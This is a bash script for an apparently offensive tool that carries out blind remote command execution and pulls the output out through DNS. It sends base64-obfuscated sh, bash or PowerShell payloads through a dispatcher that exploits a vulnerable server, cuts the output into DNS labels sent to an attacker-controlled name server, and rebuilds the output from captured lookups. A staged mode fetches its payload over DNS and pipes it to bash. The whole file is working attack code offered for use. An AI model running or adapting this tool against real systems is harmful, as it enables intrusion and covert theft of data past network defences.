#!/bin/bash

nlabels=4
label_size=30
debug=0
shell=bash #bash, sh or powershell
strict_label_charset=1
outfile=/dev/stdout
timeout=10
threads=10
s_dns_trigger="dig +short"

signature="---procrustis--"
trap "setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)" EXIT

########FUNCTION DEFINITIONS#############
function usage {
    cat <<-!
Usage:
    $0 [OPTION]... -- CMD
    
    -h HOST             The host with an NS record pointing to a name server under our control. This can be a random name in case we control the name server through the DNS_TRIGGER and direct connections to that NS are allowed by the target server (unlikely)
    -d DNS_TRIGGER      The command that will trigger DNS requests on the external server
    -x DISPATCHER       Path to the script that will trigger the command execution on the server. 
                        The script should take as argument a command and have it executed on the target server
                        example: curl https://vulnerable_server --data-urlencode "cmd=${1}"
    -n NLABELS=4        The number of labels to use for the data exfiltration. data1.data2...dataN.uid.yourdns.ns
    -s LABEL_SIZE=30    The size of each label. len(data1)
    -o FILE=stdout      The file where the command output will be stored
    -w SHELL=bash       Supported shells are bash, sh, powershell|ps
    -m TIMEOUT=10       Seconds after which the script exits when no new data are received
    -t THREADS=10       Number of threads/processes to use when extracting the data (i.e. #DISPATCHER instances)
    -r                  No encoding of +/= characters before issuing dns requests
    -v                  Verbose mode
    
    Staged Mode:
    -z NSCONFIG         The path to the script that will have dnslivery running
    -k S_DNS_TRIGGGER   The dns trigger for the stager, defaults to: "dig +short" 
    
    Examples:
    stdbuf -oL tcpdump --immediate -l -i any udp port 53|$0 -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret'
    
    $0 -h youdns.ns -w ps -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {\$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
!
}

function debug_print {
    [[ $debug -ne 0 ]] && echo "$@"
}

function b64 {
    local target_enc="UTF-8"
    
    [[ $shell == powershell ]] && target_enc=UTF-16LE
    if [[ $1 == -d ]]; then
        base64 -d
    else
        iconv -f UTF-8 -t "$target_enc" | base64 -w0
    fi
}

function strict_translator {
    local data sed_arg
        
    #we expect one line of data
    IFS= read -r data
    if [[ $strict_label_charset -eq 1 ]]; then
        [[ -z $1 ]] && data=$(echo "$data"|sed "s_+_-1_g; s_/_-2_g; s_=_-3_g")
        [[ ! -z $1 ]] && data=$(echo "$data"|sed "s_-1_+_g; s_-2_/_g; s_-3_=_g")
    fi
    printf %s "$data"  
}

function assign {
    [[ $1 == "$shell" ]] && {
        declare -g "$2"="$3"
    }
}

#######END OF FUNCTIONS#########

######ARGUMENT PROCESSING############

[[ $# -eq 0 ]] && {
    usage
    exit
}

while [[ $# -gt 0 ]]; do
    key="$1"

    case $key in
        -h)
        dns_host="$2"
        shift
        shift
        ;;
        -d)
        dns_trigger="$2"
        shift
        shift
        ;;
        -n)
        nlabels="$2"
        shift
        shift
        ;;
        -s)
        label_size="$2"
        shift
        shift
        ;;
        -x)
        dispatcher="$2"
        shift
        shift
        ;;
        -z)
        nsconfig="$2"
        shift
        shift
        ;;
        -o)
        outfile="$2"
        shift
        shift
        ;;
        -w)
        shell="$2"
        shift
        shift
        ;;
        -t)
        threads="$2"
        shift
        shift
        ;;
        -k)
        s_dns_trigger="$2"
        shift
        shift
        ;;
        -m)
        timeout="$2"
        shift
        shift
        ;;
        -r|--relaxed)
        strict_label_charset=0
        shift
        ;;
        -v|--debug)
        debug=1
        shift
        ;;
        --help)
        usage
        exit
        shift
        ;;
        --)
        shift
        break
        ;;
        *) 
        echo "invalid option $1"
        exit
        ;;
    esac
done

cmd="$*"

mandatory_args=(dns_host dns_trigger dispatcher cmd)
for arg in "${mandatory_args[@]}"; do
    [[ -z ${!arg} ]] && echo "Missing arg: $arg" && exit
done

[[ $shell == ps ]] && shell=powershell

supported_shells=(sh bash bash2 powershell)
[[ -z $(IFS=@;[[ @"${supported_shells[*]}"@ == *@"$shell"@* ]] && echo yes) ]] && {
    echo "$shell is not supported"
    echo "Currently supported shells: ${supported_shells[*]}"
    exit
}

YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m'
printf "${YELLOW}******${shell^^}******${NC}\n"
printf "Dispatcher: ${YELLOW}%s${NC}\n" "$dispatcher"
printf "Base DNS Host: ${YELLOW}%s${NC}\n" "$dns_host"
printf "DNS Trigger Command: ${YELLOW}%s${NC}\n" "$dns_trigger"
printf "Number of labels and label size: ${YELLOW}${nlabels}x${label_size}${NC}\n"
printf "Number of remote threads: ${YELLOW}${threads}${NC}\n"
printf "Timeout: ${YELLOW}${timeout}${NC}\n"
[[ ! -x $dispatcher ]] && printf "${RED}Dispatcher file is not executable${NC}\n"
[[ $strict_label_charset -ne 1 && $shell == powershell ]] && printf "${RED}Windows+Strict Label Charset OFF=?${NC}\n"
[[ -t 0 ]] && printf "${RED}NS DNS data are expected through stdin, check usage examples${NC}\n"

##########END OF ARGUMENT PROCESSING#############

##########sh definitions#######
assign sh outer_cmd_template 'sh -c $@|base64${IFS}-d|sh . echo %CMD_B64%'

assign sh inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
[[ $strict_label_charset -eq 1 ]] && {
    assign sh inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
}
#assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$(($(date +%N)/100000%5)) -eq 0 ]] && wait or sleep' ."

##########bash definitions#######
assign bash stager_template 'while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(%S_DNS_TRIGGGER% $i.%UNIQUE_DNS_HOST%);c=$(printf "%02x " ${a[*]}|xxd -r -p);done|bash'

assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'

assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
[[ $strict_label_charset -eq 1 ]] && {
    assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
}
#assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$((RANDOM%10)) -eq 0 ]] && wait or sleep' ."

###########powershell definitions########
assign powershell outer_cmd_template "powershell -enc %CMD_B64%"

#since powershell v7, we can add -Parallel and throttleLimit as parameters to foreach for multi process/threading extraction
#we cant really depend on it, for now serialized
assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})+(echo \"\`n%SIGNATURE%\"))) -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
[[ $strict_label_charset -eq 1 ]] && {
    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})+(echo \"\`n%SIGNATURE%\"))) -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
}

#######end of definitions###########

#definitions sanity check
vars=(outer_cmd_template inner_cmd_template)
for var in "${vars[@]}"; do
    [[ -z ${!var} ]] && echo "Undeclared var: $var" && exit
done

#####MAIN###########
exec {dns_data_fd}<&0
exec 0</dev/tty

run_uid=$(date +%s) #used to identify the traffic generated by the current session
stager_unique_dns_host="${run_uid}s.${dns_host}"
unique_dns_host="${run_uid}.${dns_host}"

#extracting command output length
echo -e "\nTrying to execute: \"${cmd}\""
inner_cmd=${inner_cmd_template}
inner_cmd=${inner_cmd//'%DNS_TRIGGER%'/$dns_trigger}
inner_cmd=${inner_cmd//'%UNIQUE_DNS_HOST%'/$unique_dns_host}
inner_cmd=${inner_cmd//'%NLABELS%'/$nlabels}
inner_cmd=${inner_cmd//'%LABEL_SIZE%'/$label_size}
inner_cmd=${inner_cmd//'%CHUNK_SIZE%'/$((nlabels*label_size))}
inner_cmd=${inner_cmd//'%SIGNATURE%'/"${signature}"}
inner_cmd=${inner_cmd//'%THREADS%'/"${threads}"}
debug_print "inner_cmd=$inner_cmd"

if [[ -z $nsconfig ]]; then
    cmd_b64=$(echo "$inner_cmd"|b64)
    debug_print "cmd_b64=$cmd_b64"
else
    [[ -z $stager_template ]] && echo "Staged version for $shell is not yet supported" && exit
    inner_cmd_tmp=$(echo "$inner_cmd"|base64 -w0) #temporary encoding to avoid special chars
    tmux split-window "echo '$inner_cmd_tmp'|'$nsconfig'"
    
    stager=${stager_template}
    stager=${stager//'%UNIQUE_DNS_HOST%'/$stager_unique_dns_host}
    stager=${stager//'%S_DNS_TRIGGGER%'/$s_dns_trigger}
    cmd_b64=$(echo "$stager"|b64)
    echo "Stager: $stager"
    echo "Payload: $inner_cmd"
    
    sleep 3 #wait for nsconfig to start serving
    echo "$stager"|"$dispatcher" >/dev/null 2>&1 &
fi

outer_cmd=${outer_cmd_template//'%CMD_B64%'/$cmd_b64}
debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"

echo "$outer_cmd"|"$dispatcher" >/dev/null 2>&1 &
    
postfix="$unique_dns_host"
all_chunks=()
last_valid_time=$SECONDS
while :;do 
    read -t $timeout -u "$dns_data_fd" -r line || break
    [[ $((SECONDS-last_valid_time)) -gt $timeout ]] && break
    if [[ $line == *"${postfix}"* ]]; then
        last_valid_time=$SECONDS
        
        full_dns_req=$(echo "$line"|grep -Eo "[^ ]+${postfix}")
        debug_print "full_dns_req=$full_dns_req"
        
        all_data=${full_dns_req%${postfix}}
        index=${all_data##*.}
        chunk=$(printf %s "${all_data%.*}" | tr -d '.')
        debug_print "index=$index chunk=$chunk"
        
        all_chunks[$index]=$chunk
        [[ ${#chunk} -ne $((nlabels*label_size)) ]] && nchunks=$index
        [[ ${#all_chunks[@]} -eq $nchunks ]] && break
        
        printf "\rReceived chunks: ${#all_chunks[@]}"
    fi
done && echo

output=$((IFS=;echo "${all_chunks[*]}")|strict_translator -d|b64 -d)
last_line=$(echo "$output"|tail -n1)
echo "$output"|sed '$d' >> "$outfile"

[[ $last_line != "$signature" ]] && printf "\n${RED}Missing the output signature: try increasing timeout${NC}"